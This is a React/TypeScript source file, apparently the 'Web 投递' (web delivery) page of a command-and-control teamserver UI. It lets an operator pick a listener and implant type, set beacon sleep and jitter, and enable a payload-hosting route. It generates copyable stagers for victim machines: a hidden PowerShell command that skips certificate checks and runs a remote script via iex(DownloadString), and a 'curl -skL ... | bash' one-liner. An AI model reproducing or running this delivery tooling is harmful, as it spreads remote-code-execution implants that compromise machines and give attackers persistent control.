import { useEffect, useMemo, useState } from 'react'
import { useStore } from '../store'
import { AGENT_PROFILES } from '../api/listeners'
import { copyText } from '../utils'

type Status = {
  script_route?: string
  payload_route?: string
  listener?: string
  agent_name?: string
  format?: string
  arch?: string
  cache_entries?: number
  c2_host_url?: string
  sleep?: string
  jitter?: number
  cache_ttl_min?: number
}

type Target = 'windows' | 'linux'

const SCRIPT_ROUTE = '/deliver'
const PAYLOAD_ROUTE = '/deliver/payload'

function joinUrl(base: string, route: string) {
  const b = (base || '').replace(/\/+$/, '')
  const r = route.startsWith('/') ? route : `/${route}`
  return `${b}${r}`
}

function teamserverApiOrigin(apiBase: string) {
  const raw = (apiBase || '').trim()
  if (/^https?:\/\//i.test(raw)) return raw.replace(/\/+$/, '')
  if (typeof window !== 'undefined' && window.location?.origin) {
    return `${window.location.origin}/api`
  }
  return ''
}

/** Agents that can actually callback on this listener for the chosen OS. */
function agentsForListener(reg?: string, target?: Target): string[] {
  const r = String(reg || '')
  if (r === 'BeaconHTTP' || r === 'BeaconDNS') return target === 'linux' ? [] : ['beacon']
  if (r === 'BeaconWS') return target === 'linux' ? ['linux'] : ['beacon']
  if (r === 'GopherTCP') return target === 'linux' ? ['linux', 'gopher'] : ['gopher']
  if (r === 'LinuxTCP') return target === 'linux' ? ['linux'] : []
  return []
}

function defaultFormat(agent: string, target: Target) {
  if (agent === 'gopher') return target === 'linux' ? 'Binary .ELF' : 'Binary EXE'
  if (agent === 'linux') return 'Binary ELF (Native)'
  return 'Exe'
}

const DELIVER_LISTENERS = new Set([
  'BeaconHTTP',
  'BeaconWS',
  'BeaconDNS',
  'GopherTCP',
])

function listenerHint(reg?: string) {
  if (reg === 'BeaconWS') return 'Linux 走 HTTP Upgrade / WebSocket'
  if (reg === 'BeaconHTTP') return 'Windows Beacon HTTP 回连'
  if (reg === 'GopherTCP') return 'TCP 回连 · 可选 linux / gopher'
  if (reg === 'BeaconDNS') return 'Windows Beacon DNS'
  return ''
}

export function WebDelivery() {
  const listeners = useStore((s) => s.listeners) || {}
  const api = useStore((s) => s.api)
  const pushLog = useStore((s) => s.pushLog)
  const pushToast = useStore((s) => s.pushToast)
  const setTab = useStore((s) => s.setTab)
  const openUiTab = useStore((s) => s.openUiTab)

  const listenerList = useMemo(
    () => Object.values(listeners).filter((l) => DELIVER_LISTENERS.has(l.l_reg_name || '')),
    [listeners],
  )

  const c2Host = useMemo(() => teamserverApiOrigin(api.baseUrl || ''), [api.baseUrl])

  const [listener, setListener] = useState('')
  const [agentName, setAgentName] = useState('beacon')
  const [format, setFormat] = useState('Exe')
  const [target, setTarget] = useState<Target>('windows')
  const [sleep, setSleep] = useState('5s')
  const [jitter, setJitter] = useState(20)
  const [busy, setBusy] = useState(false)
  const [pluginMissing, setPluginMissing] = useState(false)
  const [enabled, setEnabled] = useState(false)
  const [statusText, setStatusText] = useState('拉取服务端状态…')
  const [serverLine, setServerLine] = useState('')
  const [advanced, setAdvanced] = useState(false)

  const profile = AGENT_PROFILES.find((p) => p.agent === agentName) || AGENT_PROFILES[0]

  const compatible = useMemo(() => {
    return listenerList.filter((l) => agentsForListener(l.l_reg_name, target).length > 0)
  }, [listenerList, target])

  const agentChoices = useMemo(() => {
    const l = listenerList.find((x) => x.l_name === listener)
    return agentsForListener(l?.l_reg_name, target)
  }, [listenerList, listener, target])

  function applyListener(name: string, tgt: Target, preferAgent?: string) {
    setListener(name)
    const l = listenerList.find((x) => x.l_name === name)
    const choices = agentsForListener(l?.l_reg_name, tgt)
    const next = (preferAgent && choices.includes(preferAgent) ? preferAgent : choices[0]) || (tgt === 'linux' ? 'linux' : 'beacon')
    setAgentName(next)
    setFormat(defaultFormat(next, tgt))
  }

  useEffect(() => {
    if (!compatible.length) {
      if (listener) setListener('')
      return
    }
    if (!compatible.find((l) => l.l_name === listener)) {
      const prefer = target === 'linux'
        ? compatible.find((l) => l.l_reg_name === 'BeaconWS') || compatible[0]
        : compatible.find((l) => l.l_reg_name === 'BeaconHTTP') || compatible[0]
      applyListener(prefer.l_name, target)
    } else if (agentChoices.length && !agentChoices.includes(agentName)) {
      applyListener(listener, target)
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [compatible, target])

  function applyStatus(st: Status) {
    if (st.agent_name) setAgentName(st.agent_name)
    if (st.format) {
      const legacy: Record<string, string> = {
        'Artifact Go Exe': st.agent_name === 'gopher' ? 'Binary EXE' : 'Exe',
        'Artifact C++ Exe': 'Exe',
        'Artifact C++ DLL': 'DLL',
      }
      setFormat(legacy[st.format] || st.format)
    }
    if (st.listener) setListener(st.listener)
    if (st.sleep) setSleep(st.sleep)
    if (typeof st.jitter === 'number') setJitter(st.jitter)
    if (st.agent_name === 'linux' || (st.agent_name === 'gopher' && /ELF|Mach/i.test(st.format || ''))) {
      setTarget('linux')
    } else {
      setTarget('windows')
    }
    setEnabled(!!st.listener)
    setServerLine(st.listener ? `${st.listener} · ${st.agent_name || '-'} / ${st.format || '-'}` : '')
  }

  async function loadStatus() {
    setBusy(true)
    try {
      const st = await api.webDeliveryStatus()
      setPluginMissing(false)
      applyStatus(st)
      setStatusText(
        st.listener
          ? `已启用 · ${st.listener} · ${st.agent_name || '-'} / ${st.format || '-'}`
          : '未启用：选监听后点启用',
      )
    } catch (e: any) {
      const msg = e?.message || String(e)
      if (/404|not found|no route|webdelivery/i.test(msg) || /non-JSON/i.test(msg)) {
        setPluginMissing(true)
        setStatusText('WebDelivery 插件未加载')
      } else {
        setStatusText(`状态拉取失败: ${msg}`)
        pushLog('err', `WebDelivery status: ${msg}`)
      }
    } finally {
      setBusy(false)
    }
  }

  useEffect(() => {
    loadStatus().catch(() => {})
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  const scriptUrl = useMemo(() => joinUrl(c2Host, SCRIPT_ROUTE), [c2Host])
  const payloadUrl = useMemo(() => joinUrl(c2Host, PAYLOAD_ROUTE), [c2Host])
  const scriptPs = useMemo(() => `${scriptUrl}${scriptUrl.includes('?') ? '&' : '?'}d=ps`, [scriptUrl])
  const scriptBash = useMemo(() => `${scriptUrl}${scriptUrl.includes('?') ? '&' : '?'}d=bash`, [scriptUrl])

  const winCmd = useMemo(
    () =>
      `powershell -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={param($a,$b,$c,$d)[bool]1};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('${scriptPs}'))"`,
    [scriptPs],
  )
  const linuxCmd = useMemo(() => `curl -skL --http1.1 '${scriptBash}' | bash`, [scriptBash])
  const command = target === 'linux' ? linuxCmd : winCmd

  async function onEnable() {
    if (!listener) {
      pushToast('warn', '请先选择监听器')
      return
    }
    if (!c2Host) {
      pushToast('warn', '无法确定 teamserver 地址')
      return
    }
    const l = listenerList.find((x) => x.l_name === listener)
    const allowed = agentsForListener(l?.l_reg_name, target)
    if (!allowed.includes(agentName)) {
      pushToast('warn', `监听 ${l?.l_reg_name} 不能投递 ${agentName}`)
      return
    }
    setBusy(true)
    try {
      await api.webDeliveryConfig({
        script_route: SCRIPT_ROUTE,
        payload_route: PAYLOAD_ROUTE,
        listener,
        agent_name: agentName,
        format,
        sleep,
        jitter: Number(jitter) || 0,
        cache_ttl_min: 30,
        c2_host_url: c2Host,
        arch: '',
      } as any)
      setEnabled(true)
      pushToast('ok', '投递已启用')
      pushLog('ok', `WebDelivery listener=${listener} agent=${agentName} format=${format} host=${c2Host}`)
      await loadStatus()
    } catch (e: any) {
      const msg = e?.message || String(e)
      pushToast('err', `启用失败: ${msg}`)
      pushLog('err', `WebDelivery config: ${msg}`)
      if (/404|not found|no route/i.test(msg)) setPluginMissing(true)
    } finally {
      setBusy(false)
    }
  }

  async function copyCmd() {
    const ok = await copyText(command)
    pushToast(ok ? 'ok' : 'err', ok ? '已复制命令' : '复制失败')
  }

  function downloadPayload() {
    const q = target === 'linux' ? '?os=linux' : '?os=windows'
    window.open(`${payloadUrl}${q}`, '_blank', 'noopener')
  }

  const selected = compatible.find((l) => l.l_name === listener)

  return (
    <div className="wd-page">
      <div className="card wd-card">
        <div className="card-hd">
          <h3>Web 投递</h3>
          <span className="spacer" />
          <span className={`wd-pill ${enabled ? 'on' : ''}`}>{enabled ? '已启用' : '未启用'}</span>
        </div>
        <div className="card-bd wd-body">
          {pluginMissing && (
            <div className="hint warn-hint" style={{ marginBottom: 12 }}>
              服务端未加载 webdelivery 插件。
            </div>
          )}

          <div className="wd-step">1. 目标</div>
          <div className="chip-row">
            <button type="button" className={target === 'windows' ? 'primary' : ''} onClick={() => setTarget('windows')}>
              Windows · Beacon
            </button>
            <button type="button" className={target === 'linux' ? 'primary' : ''} onClick={() => setTarget('linux')}>
              Linux · Agent
            </button>
          </div>
          <div className="hint muted-hint" style={{ marginTop: 6 }}>
            {target === 'linux'
              ? '配对：Linux Agent → BeaconWS（HTTP Upgrade）。没有独立的 LinuxHTTP。'
              : '配对：Windows Beacon → BeaconHTTP。复制命令到目标机器执行。'}
          </div>

          <div className="wd-step">2. 监听</div>
          {compatible.length === 0 ? (
            <div className="hint warn-hint">
              没有可用监听
              <button className="ghost" style={{ marginLeft: 8 }} onClick={() => { setTab('listeners'); openUiTab('listeners') }}>
                去创建
              </button>
            </div>
          ) : (
            <div className="gen-listener-list">
              {compatible.map((l) => (
                <button
                  key={l.l_name}
                  type="button"
                  className={`gen-listener ${listener === l.l_name ? 'active' : ''}`}
                  onClick={() => applyListener(l.l_name, target, agentName)}
                >
                  <span className={`tag ${String(l.l_status).toLowerCase().includes('listen') ? 'listen' : 'offline'}`}>
                    {l.l_status || '-'}
                  </span>
                  <div className="meta">
                    <div className="name mono">{l.l_name}</div>
                    <div className="sub">
                      {l.l_reg_name} · {l.l_bind_host}:{l.l_bind_port}
                      {listenerHint(l.l_reg_name) ? ` · ${listenerHint(l.l_reg_name)}` : ''}
                    </div>
                  </div>
                </button>
              ))}
            </div>
          )}

          {agentChoices.length > 1 && (
            <>
              <div className="wd-step">Agent</div>
              <div className="chip-row">
                {agentChoices.map((a) => (
                  <button
                    key={a}
                    type="button"
                    className={agentName === a ? 'primary' : ''}
                    onClick={() => {
                      setAgentName(a)
                      setFormat(defaultFormat(a, target))
                    }}
                  >
                    {a === 'linux' ? 'Linux Agent' : a === 'gopher' ? 'Gopher' : 'Beacon'}
                  </button>
                ))}
              </div>
            </>
          )}

          <div className="wd-step">3. 上线</div>
          <div className="wd-cmd-box">
            <textarea className="wd-cmd mono" readOnly rows={3} value={c2Host ? command : '等待登录后生成命令…'} />
            <div className="wd-cmd-actions">
              <button className="primary" disabled={busy || !listener} onClick={onEnable}>
                {busy ? '同步中…' : enabled ? '重新启用' : '启用投递'}
              </button>
              <button className="primary" disabled={!c2Host} onClick={copyCmd}>复制命令</button>
              <button disabled={!c2Host || !enabled} onClick={downloadPayload}>直接下载载荷</button>
              <button disabled={busy} onClick={() => loadStatus()}>刷新</button>
            </div>
          </div>

          <div className="hint muted-hint" style={{ marginTop: 10 }}>
            {statusText}
            {serverLine ? `（服务端 ${serverLine}）` : ''}
            {selected ? ` · 本页 ${selected.l_name} / ${agentName} / ${format}` : ''}
            {enabled && selected && serverLine && !serverLine.startsWith(`${selected.l_name} ·`)
              ? ' · 点启用后才会改成当前选择'
              : ''}
            <br />
            脚本 <code className="mono">{c2Host || '…'}/deliver</code>
            {' '}载荷 <code className="mono">{c2Host || '…'}/deliver/payload</code>
          </div>

          <button className="ghost" style={{ marginTop: 12 }} onClick={() => setAdvanced((v) => !v)}>
            {advanced ? '收起高级' : '高级'}
          </button>
          {advanced && (
            <div className="wd-advanced">
              <div className="field">
                <label>格式</label>
                <div className="chip-row">
                  {profile.formats.filter((f) => f !== 'Stager' && !/Shellcode|Hex|DLL|Shared/i.test(f)).map((f) => (
                    <button key={f} type="button" className={format === f ? 'primary' : ''} onClick={() => setFormat(f)}>
                      {f}
                    </button>
                  ))}
                </div>
              </div>
              <div className="field">
                <label>Sleep / Jitter</label>
                <div style={{ display: 'flex', gap: 8 }}>
                  <input style={{ flex: 1 }} value={sleep} onChange={(e) => setSleep(e.target.value)} />
                  {agentName === 'beacon' && (
                    <input
                      type="number"
                      min={0}
                      max={100}
                      style={{ width: 90 }}
                      value={jitter}
                      onChange={(e) => setJitter(Number(e.target.value))}
                    />
                  )}
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
